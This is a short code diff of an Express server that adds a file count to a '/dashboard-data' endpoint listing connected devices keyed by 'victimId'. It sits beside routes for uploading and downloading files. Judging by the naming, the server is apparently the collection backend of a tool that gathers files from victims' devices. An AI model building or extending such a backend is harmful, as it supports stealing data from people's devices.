@@ -155,9 +155,17 @@ app.post('/upload', (req, res) => {
   }
 });
 
-// Route to provide dashboard data
+// Dashboard data endpoint
 app.get('/dashboard-data', (req, res) => {
-  res.json(connectedDevices);
+  const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
+     const totalFilesReceived = device.fileList.length; // Count files received
+
+     return {
+         ...device,
+         totalFiles: totalFilesReceived, // Add the total files field
+     };
+ });
+ res.json(dashboardData); // Return the updated dashboard data
 });
 
 // Route to download files
